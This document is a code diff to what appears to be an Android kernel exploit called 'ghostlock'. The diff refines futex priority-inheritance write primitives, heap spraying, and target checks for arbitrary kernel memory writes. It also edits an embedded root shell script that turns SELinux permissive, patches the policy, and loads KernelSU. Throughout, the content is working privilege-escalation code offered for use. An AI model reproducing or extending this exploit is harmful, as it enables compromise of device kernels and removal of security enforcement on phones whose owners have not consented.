@@ -25,6 +25,9 @@ const struct kernel_offsets *active_offsets = NULL;
 
 static char g_home_dir[256] = "/data/local/tmp";
 static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";
+/* the root script creates this as root, so the caller picks a per-run name
+ * and a leftover cannot be read as this run's output */
+static char g_ksu_log_path[320] = "/data/local/tmp/.ghostlock_ksu.log";
 
 /* MTK and XRing use different physical mappings from the Qualcomm default.
  * W1 has no root and /proc is SELinux-blocked: read SoC properties from the
@@ -199,7 +202,10 @@ static double timer_ms(void) {
   clock_gettime(CLOCK_MONOTONIC, &now);
   return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
 }
-#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)
+#define TIMER(label) do { \
+    pr_info("[T+%.0fms] %s\n", timer_ms(), label); \
+    log_sync(); \
+  } while (0)
 
 extern int pselect_custom_write;
 extern uintptr_t pselect_custom_target;
@@ -230,7 +236,7 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   int tid = (int)syscall(SYS_gettid);
   atomic_store(&waiter_tid, tid);
   if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
-    pr_error("waiter lock chain errno=%d\n", errno);
+    pr_warning("waiter lock chain errno=%d\n", errno);
   atomic_store(&waiter_ready, 1);
   while (!atomic_load(&owner_started)) usleep(1000);
   struct timespec timeout;
@@ -252,7 +258,7 @@ void *waiter_thread(void *arg __attribute__((unused))) {
 void *owner_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
-  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
+  if (lock_target != 0) pr_warning("owner lock target errno=%d\n", errno);
   while (!atomic_load(&waiter_ready)) usleep(1000);
   atomic_store(&owner_started, 1);
   futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
@@ -351,8 +357,18 @@ int run_main_route_threads(void) {
          atomic_load(&consumer_success) > 0 && route_last_step == 0;
 }
 
+/* a target outside the direct map is wrong by construction, so it is worth
+ * neither a spray nor a retry */
+static int in_direct_map(uintptr_t target) {
+  return target > DIRECT_MAP_BASE && target < g_direct_map_end;
+}
+
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
   pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
+  if (!in_direct_map(target)) {
+    pr_warning("  target is outside the direct map, not writing\n");
+    return 0;
+  }
   /* Both transports write *(target) := value through the erase left-only
    * relink: waiter words are {pc = value, right = 0, left = target} and
    * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
@@ -362,6 +378,15 @@ static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) 
   page_base = prepare_good_kernel_page();
   if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
   TIMER("  heap spray done");
+  /* only the leaf arm stores zero, and the value arm does not, so a leaf
+   * payload fired at a value target zeroes it */
+  int arm_matches = leaf ? (fake_right == 0) : (fake_right != 0);
+  if (!arm_matches) {
+    pr_warning("  payload arm mismatch leaf=%d fake_right=%016zx; skipping "
+               "write\n", leaf, fake_right);
+    clear_pselect_write();
+    return 0;
+  }
   int routed = run_main_route_threads();
   TIMER("  PI route done");
   clear_pselect_write();
@@ -509,7 +534,90 @@ static void init_runtime_paths(void) {
    * reading was wrong.) */
   snprintf(g_root_script_path, sizeof(g_root_script_path),
            "%s/.ghostlock_root.sh", g_home_dir);
+  const char *ksu_log = getenv("GHOSTLOCK_KSU_LOG");
+  if (ksu_log && ksu_log[0]) {
+    snprintf(g_ksu_log_path, sizeof(g_ksu_log_path), "%s", ksu_log);
+  } else {
+    snprintf(g_ksu_log_path, sizeof(g_ksu_log_path),
+             "%s/.ghostlock_ksu.log", g_home_dir);
+  }
   pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
+}
+
+/* Lowest start and highest end of the System RAM banks in a /proc/iomem dump.
+ * A nested bank lies inside its parent, so it cannot widen either bound. */
+static int iomem_map_span(FILE *f, uint64_t *map_span) {
+  unsigned long long base = 0, top = 0;
+  char *line = NULL;
+  size_t cap = 0;
+  int found = 0;
+
+  while (getline(&line, &cap, f) > 0) {
+    size_t len = strlen(line);
+    unsigned long long a, b;
+    int used = 0;
+
+    while (len && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
+      line[--len] = '\0';
+    }
+    /* %n pins the match to the whole line, since sscanf returns 2 even when a
+     * trailing literal mismatches */
+    if (sscanf(line, " %llx-%llx : System RAM%n", &a, &b, &used) == 2 &&
+        used == (int)len) {
+      if (!found || a < base) {
+        base = a;
+        found = 1;
+      }
+      if (b + 1 > top) top = b + 1;
+    }
+  }
+  free(line);
+
+  /* the map starts at the dram base the kernel rounded down to a gib, which is
+   * what memstart_addr holds */
+  base &= ~((1ULL << 30) - 1);
+  if (!found || top <= base) return 0;
+  *map_span = top - base;
+  return 1;
+}
+
+/* A rooted run leaves its /proc/iomem in the home dir, the only source for this
+ * unit's direct map size. */
+static void apply_iomem_cache(void) {
+  char path[300], stamp[128] = "";
+  uint64_t span = 0;
+  int ok = 0;
+  const char *release = active_offsets ? active_offsets->uname_r : "";
+
+  snprintf(path, sizeof(path), "%s/.ghostlock_iomem", g_home_dir);
+  FILE *f = fopen(path, "r");
+  if (f) {
+    /* the first line names the release that wrote the dump */
+    if (fgets(stamp, sizeof(stamp), f)) {
+      stamp[strcspn(stamp, "\r\n")] = '\0';
+      ok = strncmp(stamp, "# ", 2) == 0 && strcmp(stamp + 2, release) == 0 &&
+           iomem_map_span(f, &span);
+    }
+    fclose(f);
+  }
+
+  /* the base is rounded down to a gib, so a span under that holds no real bank,
+   * and the span has to cover the dram the unit reports. it also stays inside
+   * the bound the built-in geometry already uses, so a measured end can only
+   * narrow what this build would otherwise trust. an unmeasurable ram rejects
+   * the dump */
+  long pages = sysconf(_SC_PHYS_PAGES), page_sz = sysconf(_SC_PAGE_SIZE);
+  uint64_t dram = (pages > 0 && page_sz > 0)
+                      ? (uint64_t)pages * (uint64_t)page_sz : 0;
+  if (!ok || !dram || span < (1ULL << 30) || span < dram ||
+      span >= DIRECT_MAP_END - DIRECT_MAP_BASE) {
+    pr_info("iomem cache: no usable dump, keeping the built-in geometry\n");
+    return;
+  }
+
+  g_direct_map_end = DIRECT_MAP_BASE + span;
+  pr_info("iomem cache: direct_map_end=%016llx\n",
+          (unsigned long long)g_direct_map_end);
 }
 
 static void write_root_script(void) {
@@ -542,7 +650,7 @@ static void write_root_script(void) {
       "HOME_DIR='%s'\n"
       "GHOSTLOCK_SKIP_FIXUP_BAKED='%s'\n"
       "GHOSTLOCK_INSMOD_ONLY_BAKED='%s'\n"
-      "LOG=\"$HOME_DIR/.ghostlock_ksu.log\"\n"
+      "LOG='%s'\n"
       "KSUD=\"$HOME_DIR/ksud\"\n"
       /* Open the log FIRST. It used to sit behind a bare `sync`, and the hit
        * of 2026-09-11 10:20 produced no log at all although the script itself
@@ -617,6 +725,16 @@ static void write_root_script(void) {
       "ls -la /sys/fs/pstore/ >>\"$LOG\" 2>&1\n"
       "cat /sys/fs/pstore/* > \"$HOME_DIR/.ghostlock_pstore.log\" 2>/dev/null\n"
       "echo \"[*] pstore harvested: $(wc -c < \"$HOME_DIR/.ghostlock_pstore.log\" 2>/dev/null) bytes\" >>\"$LOG\"\n"
+      /* the rename is atomic, so a failed read leaves the old dump in place */
+      "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
+      "if cat /proc/iomem >>\"$HOME_DIR/.ghostlock_iomem.new\" 2>/dev/null && grep -q 'System RAM' \"$HOME_DIR/.ghostlock_iomem.new\"; then\n"
+      "  mv \"$HOME_DIR/.ghostlock_iomem.new\" \"$HOME_DIR/.ghostlock_iomem\"\n"
+      "  chmod 644 \"$HOME_DIR/.ghostlock_iomem\" 2>/dev/null\n"
+      "  echo \"[*] iomem cache: cached $(wc -c <\"$HOME_DIR/.ghostlock_iomem\") bytes\" >>\"$LOG\"\n"
+      "else\n"
+      "  rm -f \"$HOME_DIR/.ghostlock_iomem.new\"\n"
+      "  echo '[!] iomem cache: /proc/iomem read failed' >>\"$LOG\"\n"
+      "fi\n"
       "KVER=$(uname -r | cut -d. -f1-2)\n"
       "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
       "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
@@ -656,6 +774,10 @@ static void write_root_script(void) {
       "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\") || return 1\n"
       "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
       "}\n"
+      "KSU_ALREADY=0\n"
+      "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+      "  KSU_ALREADY=1\n"
+      "fi\n"
       "FIXUP_RC=1\n"
       "# GHOSTLOCK_SKIP_POLICY_FIXUP=1 skips load_policy entirely.\n"
       "# Rationale (on-device evidence): replacing the whole SELinux policy makes\n"
@@ -670,6 +792,7 @@ static void write_root_script(void) {
       "  echo '[*] policy fixup SKIPPED (permissive suffices)' >>\"$LOG\"\n"
       "  FIXUP_RC=0\n"
       "else\n"
+      "# a reload unlabels running processes, init exits 127 on the stale SID\n"
       "for i in $(seq 1 10); do\n"
       "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
       "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
@@ -691,17 +814,15 @@ static void write_root_script(void) {
       "fi\n"
       "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
       "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
-      "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
-      "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
-      "  KSU_ALREADY=1\n"
-      "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
+      "# load_policy ok: late-load only when the module is not in the tree yet\n"
+      "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
+      "  echo '[+] kernelsu already loaded; no late-load' >>\"$LOG\"\n"
       "else\n"
-      "  KSU_ALREADY=0\n"
       "  if [ ! -x \"$KSUD\" ]; then\n"
       "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
       "    exit 1\n"
       "  fi\n"
-      "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
+      "  echo \"[*] late-load kmi=$KMI as uid=$(id -u)\" >>\"$LOG\"\n"
       "  chmod 755 \"$KSUD\" 2>/dev/null\n"
       "  case \"$KSUD\" in\n"
       "    *libapd.so)\n"
@@ -794,12 +915,17 @@ static void write_root_script(void) {
       "echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
       "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
       "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
+      "fi\n"
+      "# enforcing puts the app dir out of reach, so the native side reads\n"
+      "# the outcome\n"
+      "if [ \"$(cat /sys/fs/selinux/enforce 2>/dev/null)\" != \"1\" ]; then\n"
       "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
       "fi\n"
       "else\n"
       "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
-      "fi\n",
-      g_home_dir, v_skipfix, v_insmod);
+      "fi\n"
+      "exit 0\n",
+      g_home_dir, v_skipfix, v_insmod, g_ksu_log_path);
   if (n < 0 || n >= (int)sizeof(script)) {
     pr_warning("root script too long\n");
     close(sfd);
@@ -1056,7 +1182,9 @@ static uintptr_t perf_find_task(void) {
         uint64_t *regs = (uint64_t *)p;
         for (int i = 0; i < 32 && nc < 8192; i++) {
           uint64_t v = regs[i];
-          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
+          /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
+          v |= 0x0fULL << 56;
+          if (in_direct_map(v))
             cands[nc++] = v;
         }
       }
@@ -1181,13 +1309,16 @@ static void child_main(struct child_pipes *p) {
         ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
       write(p->uid_w, &report, sizeof(report));
     }
-    else if (cmd == 'P') {
+    else if (cmd == 'P' || (cmd == 'X' && getuid() == 0)) {
       /* w2 rooted this task; park */
       close(p->cmd_r);
       close(p->uid_w);
       park_rooted_child();
     }
-    else if (cmd == 'G' || cmd == 'X') break;
+    else if (cmd == 'G') break;
+    /* X retires a task w2 rooted without starting the root script. a rooted
+     * exit drops the init_cred ref w2 never took, so it parks above. */
+    else if (cmd == 'X') _exit(1);
   }
   close(p->cmd_r);
   if (getuid() != 0) { close(p->uid_w); _exit(1); }
@@ -1197,6 +1328,8 @@ static void child_main(struct child_pipes *p) {
     int fl = fcntl(fd, F_GETFD);
     if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
   }
+  /* the script appends to this path, a leftover reads as this run's result */
+  unlink(g_ksu_log_path);
   pid_t worker = fork();
   if (worker == 0) {
     /* Detach into a brand-new session: the independent root shell owns the
@@ -1216,12 +1349,28 @@ static void child_main(struct child_pipes *p) {
   park_rooted_child();
 }
 
+/* the route dup2s its block fd over every low fd in the fdset, so keep the
+ * child pipes above PSELECT_ROUTE_NFDS or verify reads hit a timerfd */
+static int raise_pipe_fd(int fd) {
+  int high = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 96);
+  if (high < 0) {
+    pr_warning("pipe fd raise failed fd=%d errno=%d\n", fd, errno);
+    return -1;
+  }
+  close(fd);
+  return high;
+}
+
 static pid_t spawn_child(struct child_pipes *p) {
   int p1[2], p2[2], p3[2];
   if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
-  p->task_r = p1[0]; p->task_w = p1[1];
-  p->cmd_r = p2[0]; p->cmd_w = p2[1];
-  p->uid_r = p3[0]; p->uid_w = p3[1];
+  int *raised[6] = {&p->task_r, &p->task_w, &p->cmd_r,
+                    &p->cmd_w,  &p->uid_r,  &p->uid_w};
+  int *raw[6] = {&p1[0], &p1[1], &p2[0], &p2[1], &p3[0], &p3[1]};
+  for (int i = 0; i < 6; i++) {
+    *raised[i] = raise_pipe_fd(*raw[i]);
+    if (*raised[i] < 0) return -1;
+  }
   pid_t child = fork();
   if (child < 0) return -1;
   if (child == 0) { child_main(p); _exit(1); }
@@ -1246,6 +1395,13 @@ static int retry_write_stage(
     const char *stage, uintptr_t target, int mode, int attempts,
     useconds_t settle_usec, write_stage_verify_fn verify, void *context,
     int leaf) {
+  /* no attempt can move a target that is wrong by construction, and the
+   * stage belongs in the log with the address rather than the route */
+  if (!in_direct_map(target)) {
+    pr_warning("%s: target 0x%016zx is outside the direct map, not attempting\n",
+               stage, target);
+    return 0;
+  }
   for (int attempt = 1; attempt <= attempts; attempt++) {
     pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
     /* the previous attempt's write can land after its verify read; check
@@ -1403,12 +1559,14 @@ int run_exploit(int argc, char **argv) {
   signal(SIGPIPE, SIG_IGN);
   set_limit();
   reserve_low_fds();
+  reserve_standard_io();
   init_cpu_config();
   init_runtime_paths();
   write_root_script();
 
   if (!active_offsets && select_offsets() < 0) return 1;
 
+  apply_iomem_cache();
   log_startup_context();
   init_p0_profile();
   pin_to_core(CORE);
@@ -1758,14 +1916,22 @@ int run_exploit(int argc, char **argv) {
     int tcp_writes = tcp_route_selected();
     struct w3_stage_context w3_context = {
       .pipes = &pipes,
-      .leaf_to_target8 = !tcp_writes,
+      .leaf_to_target8 = 0,
     };
     if (!tcp_writes) {
-      int dir_ok = retry_write_stage(
-          "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
-          verify_leaf_dir_stage, &w3_context, 1);
-      if (!dir_ok) {
-        pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
+      /* a failed probe must not pick a side, guessing [target+8] would zero
+       * the word before it, inside the task struct */
+      if (!retry_write_stage(
+              "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
+              verify_leaf_dir_stage, &w3_context, 1)) {
+        if (child_alive) {
+          write(pipes.cmd_w, "X", 1);
+          waitpid(child, NULL, WNOHANG);
+          /* the next round takes over the pipe fds */
+          child_alive = 0;
+        }
+        pr_warning("W3 leaf direction probe failed; not writing blind\n");
+        continue;
       }
     }
 
@@ -1848,40 +2014,30 @@ int run_exploit(int argc, char **argv) {
    * the app-readable log for the loaded-module line (up to ~30s). */
   int ksu_log_loaded = 0;
   int ksu_log_failed = 0;
-  for (int i = 0; i < 60 && !(ksu_log_loaded || ksu_log_failed); i++) {
-    char ksu_log_path[320];
-    snprintf(ksu_log_path, sizeof(ksu_log_path), "%s/.ghostlock_ksu.log", g_home_dir);
-    FILE *lf = fopen(ksu_log_path, "r");
+  for (int i = 0; i < 60 && !ksu_log_failed && !ksu_log_loaded; i++) {
+    FILE *lf = fopen(g_ksu_log_path, "r");
     if (lf) {
       char line[256];
       while (fgets(line, sizeof(line), lf)) {
-        if (strstr(line, "[+] KernelSU module loaded")) ksu_log_loaded = 1;
+        if (strstr(line, "[+] KernelSU module loaded") ||
+            strstr(line, "[+] kernelsu already loaded"))
+          ksu_log_loaded = 1;
         if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
       }
       fclose(lf);
     }
-    if (!(ksu_log_loaded || ksu_log_failed)) usleep(500000);
+    if (!ksu_log_failed && !ksu_log_loaded) usleep(500000);
   }
-  /* Module init re-enforces at the very end of kernelsu_init; wait up to
-   * 20s for it. Denied read or value 1 both mean enforcing here. */
-  int enforce_ok = 0;
-  for (int i = 0; ksu_log_loaded && !enforce_ok && i < 200; i++) {
-    int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
-    if (efd < 0) {
-      enforce_ok = 1;
-      break;
-    }
-    char eb[4] = {0};
-    ssize_t rn = read(efd, eb, sizeof(eb));
-    close(efd);
-    if (rn > 0 && eb[0] == '1') enforce_ok = 1;
-    if (!enforce_ok) usleep(100000);
-  }
-  if (enforce_ok)
-    pr_info("enforce=1 (enforcing)\n");
-  else if (ksu_log_loaded)
-    pr_warning("enforce=0 (still permissive)\n");
   kernelsu_ready = kernelsu_ready || ksu_log_loaded;
+  /* enforcing takes the app dir away from the root script, so its log stops
+   * before the restore. the state has to be read from here. */
+  int enforced = 0;
+  for (int i = 0; i < 20 && !(enforced = !check_selinux_off()); i++)
+    usleep(500000);
+  if (enforced)
+    pr_success("enforcing restored\n");
+  else
+    pr_warning("SELinux left permissive\n");
 
   /* Fixup: permissive, load_policy, late-load. Module init re-enforces;
    * policy reload keeps it working after enforcing is back. */
